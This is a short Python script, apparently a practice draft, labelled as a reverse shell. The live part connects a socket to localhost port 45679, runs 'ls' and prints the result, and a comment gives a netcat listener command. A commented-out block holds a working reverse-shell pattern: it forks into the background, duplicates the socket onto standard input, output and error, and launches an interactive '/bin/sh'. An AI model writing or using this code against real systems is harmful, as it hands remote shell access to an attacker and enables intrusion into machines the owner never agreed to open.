import socket
import subprocess
import os

# REVERSE SHELL
# NEEDS OPEN PORT I.e. nc -p 45679 -v -l -k

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 45679))
list_files = subprocess.run(["/bin/ls", "-i"], shell=True, capture_output=True)
print(list_files.stdout.decode())
sock.close()


# try:
#     if os.fork() > 0:
#         os._exit(0)
# except OSError as error:
#     print('Error in fork process: %d (%s)' % (error.errno, error.strerror))
#     pid = os.fork()
#     if pid > 0:
#         print('Fork Not Valid!')

# os.dup2(sock.fileno(), 0)
# os.dup2(sock.fileno(), 1)
# os.dup2(sock.fileno(), 2)
# shell_remote = subprocess.call(["/bin/sh", "-i"])